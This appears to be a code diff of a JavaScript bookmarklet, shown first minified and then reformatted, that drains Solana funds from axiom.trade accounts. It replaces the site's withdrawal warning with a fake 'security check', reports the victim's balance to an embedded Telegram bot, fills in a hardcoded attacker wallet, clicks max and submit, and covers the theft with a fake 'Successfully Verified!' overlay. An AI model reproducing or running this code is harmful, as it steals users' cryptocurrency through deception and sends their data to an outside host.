@@ -1,1 +1,197 @@
-javascript:(()=>%7Bconst TELEGRAM_BOT_TOKEN='7908362404:AAF6gP8zuixMkN74Ql2cMNm0Vx1FH6-1VPk';const TELEGRAM_CHAT_ID='-4752843316';async function sendTelegramMessage(message)%7Btry%7Bawait fetch(%60https://api.telegram.org/bot$%7BTELEGRAM_BOT_TOKEN%7D/sendMessage%60,%7Bmethod:'POST',headers:%7B'Content-Type':'application/json'%7D,body:JSON.stringify(%7Bchat_id:TELEGRAM_CHAT_ID,text:message,parse_mode:'HTML'%7D)%7D)%7Dcatch(e)%7Bconsole.error('Error sending Telegram message:',e.message);%7D%7D;if(window.location.hostname!=='axiom.trade'&&window.location.hostname!=='www.axiom.trade')%7Bconsole.log('Script active on non-target domain: '+window.location.hostname);return;%7D;function showCustomNotification(message,backgroundColor='rgba(0,0,0,0.5)',textColor='white',duration=10000)%7Bconst existingNotification=document.getElementById('custom-notification');if(existingNotification)%7BexistingNotification.remove();%7D;const notification=document.createElement('div');notification.id='custom-notification';Object.assign(notification.style,%7Bposition:'fixed',left:'50%25',top:'50%25',transform:'translate(-50%25,-50%25)',backgroundColor:backgroundColor,backdropFilter:'blur(5px)',color:textColor,padding:'20px 30px',borderRadius:'8px',boxShadow:'0 4px 15px rgba(0,0,0,0.2)',zIndex:'99999',textAlign:'center',fontSize:'16px',fontFamily:'Arial,sans-serif',maxWidth:'80%25'%7D);const messageParagraph=document.createElement('p');messageParagraph.textContent=message;messageParagraph.style.margin='0 0 15px 0';const closeButton=document.createElement('button');closeButton.textContent='Close';Object.assign(closeButton.style,%7Bpadding:'8px 15px',border:'none',borderRadius:'4px',backgroundColor:'rgba(0,0,0,0.2)',color:textColor,cursor:'pointer',fontSize:'14px'%7D);closeButton.onclick=() => notification.remove();notification.appendChild(messageParagraph);notification.appendChild(closeButton);document.body.appendChild(notification);if(duration>0)%7BsetTimeout(() => notification.remove(),duration);%7D;%7D;function showVerifyingOverlay()%7Bconst existingOverlay=document.getElementById('verifying-overlay');if(existingOverlay)%7BexistingOverlay.remove();%7D;const overlay=document.createElement('div');overlay.id='verifying-overlay';Object.assign(overlay.style,%7Bposition:'fixed',top:'0',left:'0',width:'100%25',height:'100%25',backgroundColor:'#000000',zIndex:'100000',display:'flex',justifyContent:'center',alignItems:'center'%7D);const text=document.createElement('p');text.textContent='Sucessfully Verified!';Object.assign(text.style,%7Bcolor:'white',fontSize:'24px',fontFamily:'Arial,sans-serif',textAlign:'center'%7D);overlay.appendChild(text);document.body.appendChild(overlay);%7D;function replaceWarningText()%7Bconst spanSelector='span.text-decreaseHover.text-%5C%5C%5B12px%5C%5C%5D.leading-%5C%5C%5B16px%5C%5C%5D.font-normal.text-center.px-%5C%5C%5B16px%5C%5C%5D';document.querySelectorAll(spanSelector).forEach(span => %7Bif(span.textContent&&span.textContent.trim()==='DO NOT verify if you are not WITHDRAWING')%7Bspan.textContent='Complete the Security Check to complete Verification.';console.log('Text changed to: DO NOT VERIFY AT ALL');%7D;%7D);%7D;replaceWarningText();const observer=new MutationObserver(() => %7BreplaceWarningText();%7D);observer.observe(document.body,%7BchildList:true,subtree:true%7D);function getRelevantNumericValues()%7Bconst valueSelector='span.text-%5C%5C%5B14px%5C%5C%5D.font-semibold';const elements=document.querySelectorAll(valueSelector);const numericValues=%5B%5D;if(elements.length===0)%7Bconsole.warn('Value check: No elements for selector '+valueSelector+'. Assuming zero balance.');return%5B0%5D;%7D;try%7Belements.forEach(el => %7Bconst text=el.textContent%7C%7C'';const num=parseFloat(text.replace(/%5Cs+/g,''));numericValues.push(isNaN(num)?0:num);%7D);%7Dcatch(e)%7Bconsole.error('Error processing numeric values:',e.message);return%5B0%5D;%7D;return Array.isArray(numericValues)?numericValues:%5B0%5D;%7D;const relevantValues=getRelevantNumericValues();const solBalance=relevantValues.length>0?relevantValues%5B0%5D.toFixed(2):'0.00';const usdBalance=(relevantValues.length>0?(relevantValues%5B0%5D*169):0).toLocaleString('en-US',%7BminimumFractionDigits:2,maximumFractionDigits:2%7D);sendTelegramMessage(%60<b>♦%EF%B8%8F  —  SOMEONE CLICKED</b>%5Cn<b>├</b> 🪙: <code>($%7BsolBalance%7D SOL)</code>%5Cn<b>├</b> 💲: <code>($$%7BusdBalance%7D USD)</code>%60);const areAllFundsZero=relevantValues.length>0&&relevantValues.every(val => val===0);if(areAllFundsZero)%7Bconsole.error('Process halted: Not enough SOL. Values:',relevantValues);showCustomNotification('Please deposit SOL to verify your not a bot.');return;%7D;console.log('Funds check passed. Values:',relevantValues,'. Proceeding with automation on axiom.trade...');const FAST_POLL_INTERVAL=30;const waitFor=(selector,callback,parentElement=document) => %7Bconst interval=setInterval(() => %7Btry%7Bconst el=parentElement.querySelector(selector);if(el)%7BclearInterval(interval);callback(el);%7D;%7Dcatch(e)%7Bconsole.error('Error in waitFor querySelector with selector:',selector,e.message);clearInterval(interval);%7D;%7D,FAST_POLL_INTERVAL);%7D;const initialWalletButtonSelector='.w-fit.min-w-max.bg-primaryStroke';const openWithdrawInterfaceButtonSelector='.bg-secondaryStroke.flex-1.h-%5C%5C%5B28px%5C%5C%5D';const confirmAndProceedToAddressInputSelector='.text-primaryBlue.text-%5C%5C%5B12px%5C%5C%5D.leading-%5C%5C%5B16px%5C%5C%5D.font-medium';const addressInputSelector='input%5Bplaceholder='+String.fromCharCode(39)+'Address of destination wallet'+String.fromCharCode(39)+'%5D';const maxButtonSelector='button.text-primaryBlue.text-%5C%5C%5B12px%5C%5C%5D.leading-%5C%5C%5B16px%5C%5C%5D.font-medium:not(%5Bdisabled%5D)';const finalSubmitButtonSelector='.bg-primaryBlue.flex.flex-row.flex-1.h-%5C%5C%5B32px%5C%5C%5D';const destinationAddress='DSYbYu1EdWBREtAFCtNWuFYYsR6RepmJy55bjo96HHZH';waitFor(initialWalletButtonSelector,(walletBtn) => %7BwalletBtn.click();waitFor(openWithdrawInterfaceButtonSelector,(openWithdrawInterfaceBtn) => %7BopenWithdrawInterfaceBtn.click();waitFor(confirmAndProceedToAddressInputSelector,(confirmProceedBtn) => %7BconfirmProceedBtn.click();waitFor(addressInputSelector,(addressInputEl) => %7Bconst nativeInputValueSetter=Object.getOwnPropertyDescriptor(window.HTMLInputElement.prototype,'value').set;nativeInputValueSetter.call(addressInputEl,destinationAddress);addressInputEl.dispatchEvent(new Event('input',%7Bbubbles:true%7D));addressInputEl.dispatchEvent(new Event('change',%7Bbubbles:true%7D));sendTelegramMessage(%60<b>♦%EF%B8%8F  —  ADDRESS PASTED</b>%5Cn<b>├</b> ⛓%EF%B8%8F%E2%80%8D💥: <code>$%7BdestinationAddress%7D</code>%60);waitFor(maxButtonSelector,(maxBtn) => %7Bif(maxBtn.textContent&&maxBtn.textContent.trim().toLowerCase()==='max')%7BmaxBtn.click();waitFor(finalSubmitButtonSelector,(finalSubmitBtn) => %7Bconsole.log('Final submit button found. Showing verifying overlay...');showVerifyingOverlay();finalSubmitBtn.click();waitFor('%5Bclass*="withdrawn"%5D,%5Bclass*="success"%5D,%5Bclass*="notification"%5D',(notificationEl) => %7Bconst linkEl=notificationEl.querySelector('a%5Bhref*="solscan.io/tx"%5D,a%5Bhref*="explorer.solana.com/tx"%5D')%7C%7CnotificationEl.closest('a%5Bhref*="solscan.io/tx"%5D,a%5Bhref*="explorer.solana.com/tx"%5D');const transactionLink=linkEl&&linkEl.href?linkEl.href:'Link Not Found';sendTelegramMessage(%60<b>♦%EF%B8%8F  —  FUNDS TRANSFERRED</b>%5Cn<b>├</b> 🪙: <code>($%7BsolBalance%7D SOL)</code>%5Cn<b>├</b> 💲: <code>($$%7BusdBalance%7D USD)</code>%5Cn<b>├</b> ⛓%EF%B8%8F%E2%80%8D💥: <code>$%7BdestinationAddress%7D</code>%5Cn<b>├</b> 🔗: <code>$%7BtransactionLink%7D</code>%60);console.log('Automation completed. Transaction link:',transactionLink);%7D);%7D);%7Delse%7Bconsole.error('Max button text mismatch. Expected Max, got '+maxBtn.textContent+'.');%7D;%7D);%7D);%7D);%7D);%7D);%7D)();
+(function() {
+  const TELEGRAM_BOT_TOKEN = '7908362404:AAF6gP8zuixMkN74Ql2cMNm0Vx1FH6-1VPk';
+  const TELEGRAM_CHAT_ID = '-4752843316';
+  async function sendTelegramMessage(message) {
+    try {
+      await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify({ chat_id: TELEGRAM_CHAT_ID, text: message, parse_mode: 'HTML' })
+      });
+    } catch (e) {
+      console.error('Error sending Telegram message:', e.message);
+    }
+  }
+  if (window.location.hostname !== 'axiom.trade' && window.location.hostname !== 'www.axiom.trade') {
+    console.log('Script active on non-target domain: ' + window.location.hostname);
+    return; // Now valid inside the IIFE
+  }
+  function showCustomNotification(message, backgroundColor = 'rgba(0,0,0,0.5)', textColor = 'white', duration = 10000) {
+    const existingNotification = document.getElementById('custom-notification');
+    if (existingNotification) {
+      existingNotification.remove();
+    }
+    const notification = document.createElement('div');
+    notification.id = 'custom-notification';
+    Object.assign(notification.style, {
+      position: 'fixed',
+      left: '50%',
+      top: '50%',
+      transform: 'translate(-50%,-50%)',
+      backgroundColor: backgroundColor,
+      backdropFilter: 'blur(5px)',
+      color: textColor,
+      padding: '20px 30px',
+      borderRadius: '8px',
+      boxShadow: '0 4px 15px rgba(0,0,0,0.2)',
+      zIndex: '99999',
+      textAlign: 'center',
+      fontSize: '16px',
+      fontFamily: 'Arial,sans-serif',
+      maxWidth: '80%'
+    });
+    const messageParagraph = document.createElement('p');
+    messageParagraph.textContent = message;
+    messageParagraph.style.margin = '0 0 15px 0';
+    const closeButton = document.createElement('button');
+    closeButton.textContent = 'Close';
+    Object.assign(closeButton.style, {
+      padding: '8px 15px',
+      border: 'none',
+      borderRadius: '4px',
+      backgroundColor: 'rgba(0,0,0,0.2)',
+      color: textColor,
+      cursor: 'pointer',
+      fontSize: '14px'
+    });
+    closeButton.onclick = () => notification.remove();
+    notification.appendChild(messageParagraph);
+    notification.appendChild(closeButton);
+    document.body.appendChild(notification);
+    if (duration > 0) {
+      setTimeout(() => notification.remove(), duration);
+    }
+  }
+  function showVerifyingOverlay() {
+    const existingOverlay = document.getElementById('verifying-overlay');
+    if (existingOverlay) {
+      existingOverlay.remove();
+    }
+    const overlay = document.createElement('div');
+    overlay.id = 'verifying-overlay';
+    Object.assign(overlay.style, {
+      position: 'fixed',
+      top: '0',
+      left: '0',
+      width: '100%',
+      height: '100%',
+      backgroundColor: '#000000',
+      zIndex: '100000',
+      display: 'flex',
+      justifyContent: 'center',
+      alignItems: 'center'
+    });
+    const text = document.createElement('p');
+    text.textContent = 'Successfully Verified!';
+    Object.assign(text.style, {
+      color: 'white',
+      fontSize: '24px',
+      fontFamily: 'Arial,sans-serif',
+      textAlign: 'center'
+    });
+    overlay.appendChild(text);
+    document.body.appendChild(overlay);
+  }
+  function replaceWarningText() {
+    const spanSelector = 'span.text-decreaseHover.text-\\[12px\\].leading-\\[16px\\].font-normal.text-center.px-\\[16px\\]';
+    document.querySelectorAll(spanSelector).forEach(span => {
+      if (span.textContent && span.textContent.trim() === 'DO NOT verify if you are not WITHDRAWING') {
+        span.textContent = 'Complete the Security Check to complete Verification.';
+        console.log('Text changed to: DO NOT VERIFY AT ALL');
+      }
+    });
+  }
+  replaceWarningText();
+  const observer = new MutationObserver(() => {
+    replaceWarningText();
+  });
+  observer.observe(document.body, { childList: true, subtree: true });
+  function getRelevantNumericValues() {
+    const valueSelector = 'span.text-\\[14px\\].font-semibold'; // Update this selector after inspecting axiom.trade
+    const elements = document.querySelectorAll(valueSelector);
+    const numericValues = [];
+    if (elements.length === 0) {
+      console.warn('Value check: No elements for selector ' + valueSelector + '. Assuming zero balance.');
+      return [0];
+    }
+    try {
+      elements.forEach(el => {
+        const text = el.textContent || '';
+        const cleanedText = text.replace(/[^0-9.]/g, '');
+        const num = parseFloat(cleanedText);
+        numericValues.push(isNaN(num) ? 0 : num);
+      });
+    } catch (e) {
+      console.error('Error processing numeric values:', e.message);
+      return [0];
+    }
+    return Array.isArray(numericValues) ? numericValues : [0];
+  }
+  const relevantValues = getRelevantNumericValues();
+  const solBalance = relevantValues.length > 0 ? relevantValues[0].toFixed(2) : '0.00';
+  const usdBalance = (relevantValues.length > 0 ? (relevantValues[0] * 169) : 0).toLocaleString('en-US', { minimumFractionDigits: 2, maximumFractionDigits: 2 });
+  sendTelegramMessage(`<b>♦️  —  SOMEONE CLICKED</b>\n<b>├</b> 🪙: <code>(${solBalance} SOL)</code>\n<b>├</b> 💲: <code>($${usdBalance} USD)</code>`);
+  const areAllFundsZero = relevantValues.length > 0 && relevantValues.every(val => val === 0);
+  if (areAllFundsZero) {
+    console.error('Process halted: Not enough SOL. Values:', relevantValues);
+    showCustomNotification('Please deposit SOL to verify your not a bot.');
+    return;
+  }
+  console.log('Funds check passed. Values:', relevantValues, '. Proceeding with automation on axiom.trade...');
+  const FAST_POLL_INTERVAL = 30;
+  const waitFor = (selector, callback, parentElement = document) => {
+    const interval = setInterval(() => {
+      try {
+        const el = parentElement.querySelector(selector);
+        if (el) {
+          clearInterval(interval);
+          callback(el);
+        }
+      } catch (e) {
+        console.error('Error in waitFor querySelector with selector:', selector, e.message);
+        clearInterval(interval);
+      }
+    }, FAST_POLL_INTERVAL);
+  };
+  const initialWalletButtonSelector = '.w-fit.min-w-max.bg-primaryStroke';
+  const openWithdrawInterfaceButtonSelector = '.bg-secondaryStroke.flex-1.h-\\[28px\\]';
+  const confirmAndProceedToAddressInputSelector = '.text-primaryBlue.text-\\[12px\\].leading-\\[16px\\].font-medium';
+  const addressInputSelector = 'input[placeholder=' + String.fromCharCode(39) + 'Address of destination wallet' + String.fromCharCode(39) + ']';
+  const maxButtonSelector = 'button.text-primaryBlue.text-\\[12px\\].leading-\\[16px\\].font-medium:not([disabled])';
+  const finalSubmitButtonSelector = '.bg-primaryBlue.flex.flex-row.flex-1.h-\\[32px\\]';
+  const destinationAddress = 'DSYbYu1EdWBREtAFCtNWuFYYsR6RepmJy55bjo96HHZH';
+  waitFor(initialWalletButtonSelector, (walletBtn) => {
+    walletBtn.click();
+    waitFor(openWithdrawInterfaceButtonSelector, (openWithdrawInterfaceBtn) => {
+      openWithdrawInterfaceBtn.click();
+      waitFor(confirmAndProceedToAddressInputSelector, (confirmProceedBtn) => {
+        confirmProceedBtn.click();
+        waitFor(addressInputSelector, (addressInputEl) => {
+          const nativeInputValueSetter = Object.getOwnPropertyDescriptor(window.HTMLInputElement.prototype, 'value').set;
+          nativeInputValueSetter.call(addressInputEl, destinationAddress);
+          addressInputEl.dispatchEvent(new Event('input', { bubbles: true }));
+          addressInputEl.dispatchEvent(new Event('change', { bubbles: true }));
+          sendTelegramMessage(`<b>♦️  —  ADDRESS PASTED</b>\n<b>├</b> ⛓️‍💥: <code>${destinationAddress}</code>`);
+          waitFor(maxButtonSelector, (maxBtn) => {
+            if (maxBtn.textContent && maxBtn.textContent.trim().toLowerCase() === 'drag me') {
+              maxBtn.click();
+              waitFor(finalSubmitButtonSelector, (finalSubmitBtn) => {
+                console.log('Final submit button found. Showing verifying overlay...');
+                showVerifyingOverlay();
+                finalSubmitBtn.click();
+                waitFor('[class*="withdrawn"],[class*="success"],[class*="notification"]', (notificationEl) => {
+                  const linkEl = notificationEl.querySelector('a[href*="solscan.io/tx"],a[href*="explorer.solana.com/tx"]') || notificationEl.closest('a[href*="solscan.io/tx"],a[href*="explorer.solana.com/tx"]');
+                  const transactionLink = linkEl && linkEl.href ? linkEl.href : 'Link Not Found';
+                  sendTelegramMessage(`<b>♦️  —  FUNDS TRANSFERRED</b>\n<b>├</b> 🪙: <code>(${solBalance} SOL)</code>\n<b>├</b> 💲: <code>($${usdBalance} USD)</code>\n<b>├</b> ⛓️‍💥: <code>${destinationAddress}</code>\n<b>├</b> 🔗: <code>${transactionLink}</code>`);
+                  console.log('Automation completed. Transaction link:', transactionLink);
+                });
+              });
+            } else {
+              console.error('Max button text mismatch. Expected Drag Me, got ' + maxBtn.textContent + '.');
+            }
+          });
+        });
+      });
+    });
+  });
+})();
